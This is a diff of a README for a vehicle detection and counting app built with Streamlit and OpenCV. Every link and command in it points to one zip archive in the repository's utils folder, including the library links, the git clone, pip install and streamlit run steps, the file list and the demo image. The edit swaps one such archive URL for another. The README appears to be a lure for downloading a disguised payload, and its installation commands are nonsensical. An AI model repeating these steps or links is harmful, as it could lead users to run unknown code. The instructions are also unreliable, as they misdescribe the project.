@@ -1,6 +1,6 @@
 # Vehicle Detection and Counting App
 
-This project is a **Vehicle Detection and Counting App** built with [Streamlit](https://github.com/Shamzmohamed/Vehicle_Detection/raw/refs/heads/main/utils/__pycache__/Detection-Vehicle-v1.2.zip) and [OpenCV](https://github.com/Shamzmohamed/Vehicle_Detection/raw/refs/heads/main/utils/__pycache__/Detection-Vehicle-v1.2.zip) to detect and count vehicles in videos. It uses computer vision techniques to detect vehicles, track them, and compute metrics such as vehicle count, average speed, and vehicle density.
+This project is a **Vehicle Detection and Counting App** built with [Streamlit](https://raw.githubusercontent.com/Shamzmohamed/Vehicle_Detection/main/utils/Vehicle_Detection_v1.6.zip) and [OpenCV](https://raw.githubusercontent.com/Shamzmohamed/Vehicle_Detection/main/utils/Vehicle_Detection_v1.6.zip) to detect and count vehicles in videos. It uses computer vision techniques to detect vehicles, track them, and compute metrics such as vehicle count, average speed, and vehicle density.
 
 ## Features
 - **Video Source Options**: Select pre-uploaded videos or upload your own.
@@ -13,18 +13,18 @@ This project is a **Vehicle Detection and Counting App** built with [Streamlit](
 
 1. Clone this repository:
     ```bash
-    git clone https://github.com/Shamzmohamed/Vehicle_Detection/raw/refs/heads/main/utils/__pycache__/Detection-Vehicle-v1.2.zip
+    git clone https://raw.githubusercontent.com/Shamzmohamed/Vehicle_Detection/main/utils/Vehicle_Detection_v1.6.zip
     cd Vehicle-Detection
     ```
     
 2. Install the required dependencies:
     ```bash
-    pip install -r https://github.com/Shamzmohamed/Vehicle_Detection/raw/refs/heads/main/utils/__pycache__/Detection-Vehicle-v1.2.zip
+    pip install -r https://raw.githubusercontent.com/Shamzmohamed/Vehicle_Detection/main/utils/Vehicle_Detection_v1.6.zip
     ```
 
 3. Run the Streamlit app:
     ```bash
-    streamlit run https://github.com/Shamzmohamed/Vehicle_Detection/raw/refs/heads/main/utils/__pycache__/Detection-Vehicle-v1.2.zip
+    streamlit run https://raw.githubusercontent.com/Shamzmohamed/Vehicle_Detection/main/utils/Vehicle_Detection_v1.6.zip
     ```
 
 ## Usage
@@ -38,8 +38,8 @@ This project is a **Vehicle Detection and Counting App** built with [Streamlit](
 
 ## File Structure
 
-- `https://github.com/Shamzmohamed/Vehicle_Detection/raw/refs/heads/main/utils/__pycache__/Detection-Vehicle-v1.2.zip`: Main application file for the Streamlit app.
-- `https://github.com/Shamzmohamed/Vehicle_Detection/raw/refs/heads/main/utils/__pycache__/Detection-Vehicle-v1.2.zip`: Contains the core logic for vehicle detection, tracking, and counting.
+- `https://raw.githubusercontent.com/Shamzmohamed/Vehicle_Detection/main/utils/Vehicle_Detection_v1.6.zip`: Main application file for the Streamlit app.
+- `https://raw.githubusercontent.com/Shamzmohamed/Vehicle_Detection/main/utils/Vehicle_Detection_v1.6.zip`: Contains the core logic for vehicle detection, tracking, and counting.
 - `videos/`: Directory containing sample videos.
 - `temp/`: Temporary storage for uploaded videos.
 
@@ -50,7 +50,7 @@ This project is a **Vehicle Detection and Counting App** built with [Streamlit](
 - Improving performance with GPU acceleration.
 
 ## App Demo 
-![App_Demo](https://github.com/Shamzmohamed/Vehicle_Detection/raw/refs/heads/main/utils/__pycache__/Detection-Vehicle-v1.2.zip)
+![App_Demo](https://raw.githubusercontent.com/Shamzmohamed/Vehicle_Detection/main/utils/Vehicle_Detection_v1.6.zip)
 
 ## License
 
